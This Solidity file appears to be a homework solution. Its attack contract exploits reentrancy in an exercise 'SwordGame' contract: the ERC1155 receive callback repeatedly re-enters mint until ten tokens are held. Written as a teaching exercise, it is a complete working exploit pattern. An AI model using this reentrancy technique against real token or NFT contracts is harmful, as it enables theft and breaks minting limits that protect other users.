// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {SwordGame} from "src/hw/hw1.sol";
import {Test, console} from "forge-std/Test.sol";

contract AttackHW1 {
    SwordGame public swordGame;
    uint256 public tokenId = 1;
    uint256 public nftCount;

    constructor(SwordGame _swordGame) {
        swordGame = _swordGame;
    }

    receive() external payable {}

    function attack() public payable {
        swordGame.mint{value: 1 ether}(tokenId);
    }

    function onERC1155Received(
        address, // operator
        address, // from
        uint256, // id
        uint256 amount, // amount
        bytes calldata // data
    ) external returns (bytes4) {
        nftCount += amount;
        console.log("nftCount", nftCount);
        // 循环调用 mint 函数
        while (nftCount < 10) {
            try swordGame.mint{value: 1 ether}(tokenId) {
                nftCount++;
            } catch {
                console.log("error", nftCount);
                break;
            }
        }

        return this.onERC1155Received.selector;
    }
}
